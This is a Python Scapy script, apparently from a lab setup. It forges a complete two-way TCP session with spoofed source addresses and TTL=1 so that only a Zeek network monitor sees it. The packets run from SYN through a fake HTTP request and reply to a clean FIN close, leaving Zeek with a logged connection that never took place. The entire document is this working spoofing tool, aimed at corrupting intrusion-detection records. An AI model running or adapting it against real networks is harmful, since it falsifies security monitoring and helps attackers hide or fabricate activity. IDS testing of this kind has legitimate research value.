from scapy.all import IP, TCP, send

SPOOFED_SRC   = "10.0.0.193"   # fake client (your iPhone IP)
DEST_IP       = "10.0.0.187"   # destination VM
SRC_PORT      = 4444
DEST_PORT     = 80
TTL_VALUE     = 1

def main():
    print("[+] Spoofing a full TCP session that only Zeek sees")

    client_seq = 1000
    server_seq = 2000

    # 1) SYN: client -> server (dies at Zeek)
    syn = IP(src=SPOOFED_SRC, dst=DEST_IP, ttl=TTL_VALUE) / \
          TCP(sport=SRC_PORT, dport=DEST_PORT, flags="S", seq=client_seq)
    print("[+] SYN ttl=1")
    send(syn, verbose=False)

    # 2) SYN-ACK: server -> client (also dies at Zeek)
    synack = IP(src=DEST_IP, dst=SPOOFED_SRC, ttl=TTL_VALUE) / \
             TCP(sport=DEST_PORT, dport=SRC_PORT, flags="SA",
                 seq=server_seq, ack=client_seq + 1)
    print("[+] SYN-ACK ttl=1")
    send(synack, verbose=False)

    # 3) ACK: client -> server
    ack = IP(src=SPOOFED_SRC, dst=DEST_IP, ttl=TTL_VALUE) / \
          TCP(sport=SRC_PORT, dport=DEST_PORT, flags="A",
              seq=client_seq + 1, ack=server_seq + 1)
    print("[+] ACK ttl=1 (3-way handshake complete from Zeek's POV)")
    send(ack, verbose=False)

    # --- Application data phase ---

    client_payload = b"GET / HTTP/1.1\r\n\r\n"
    server_payload = b"HTTP/1.1 200 OK\r\n\r\n"

    # 4) Client sends data
    client_data = IP(src=SPOOFED_SRC, dst=DEST_IP, ttl=TTL_VALUE) / \
                  TCP(sport=SRC_PORT, dport=DEST_PORT,
                      flags="PA",
                      seq=client_seq + 1,
                      ack=server_seq + 1) / client_payload
    print("[+] Client data ttl=1")
    send(client_data, verbose=False)

    # update client_seq to reflect bytes sent
    client_seq_end = client_seq + 1 + len(client_payload)

    # 5) Server ACKs data
    server_ack_data = IP(src=DEST_IP, dst=SPOOFED_SRC, ttl=TTL_VALUE) / \
                      TCP(sport=DEST_PORT, dport=SRC_PORT,
                          flags="A",
                          seq=server_seq + 1,
                          ack=client_seq_end)
    print("[+] Server ACK ttl=1")
    send(server_ack_data, verbose=False)

    # 6) Server sends data back
    server_data = IP(src=DEST_IP, dst=SPOOFED_SRC, ttl=TTL_VALUE) / \
                  TCP(sport=DEST_PORT, dport=SRC_PORT,
                      flags="PA",
                      seq=server_seq + 1,
                      ack=client_seq_end) / server_payload
    print("[+] Server data ttl=1")
    send(server_data, verbose=False)

    server_seq_end = server_seq + 1 + len(server_payload)

    # 7) Client ACKs server data
    client_ack_server = IP(src=SPOOFED_SRC, dst=DEST_IP, ttl=TTL_VALUE) / \
                        TCP(sport=SRC_PORT, dport=DEST_PORT,
                            flags="A",
                            seq=client_seq_end,
                            ack=server_seq_end)
    print("[+] Client ACK server data ttl=1")
    send(client_ack_server, verbose=False)

    # --- Graceful close with FIN/ACK on both sides ---

    # 8) Client sends FIN
    fin_client = IP(src=SPOOFED_SRC, dst=DEST_IP, ttl=TTL_VALUE) / \
                 TCP(sport=SRC_PORT, dport=DEST_PORT,
                     flags="FA",
                     seq=client_seq_end,
                     ack=server_seq_end)
    print("[+] Client FIN ttl=1")
    send(fin_client, verbose=False)

    # 9) Server ACKs client FIN
    server_ack_fin = IP(src=DEST_IP, dst=SPOOFED_SRC, ttl=TTL_VALUE) / \
                     TCP(sport=DEST_PORT, dport=SRC_PORT,
                         flags="A",
                         seq=server_seq_end,
                         ack=client_seq_end + 1)
    print("[+] Server ACK client FIN ttl=1")
    send(server_ack_fin, verbose=False)

    # 10) Server sends its own FIN
    fin_server = IP(src=DEST_IP, dst=SPOOFED_SRC, ttl=TTL_VALUE) / \
                 TCP(sport=DEST_PORT, dport=SRC_PORT,
                     flags="FA",
                     seq=server_seq_end,
                     ack=client_seq_end + 1)
    print("[+] Server FIN ttl=1")
    send(fin_server, verbose=False)

    # 11) Client ACKs server FIN
    final_ack = IP(src=SPOOFED_SRC, dst=DEST_IP, ttl=TTL_VALUE) / \
                TCP(sport=SRC_PORT, dport=DEST_PORT,
                    flags="A",
                    seq=client_seq_end + 1,
                    ack=server_seq_end + 1)
    print("[+] Final ACK ttl=1 (clean close)")
    send(final_ack, verbose=False)

    print("[+] Done. Zeek should see this as a fully established and cleanly closed TCP connection.")

if __name__ == "__main__":
    main()

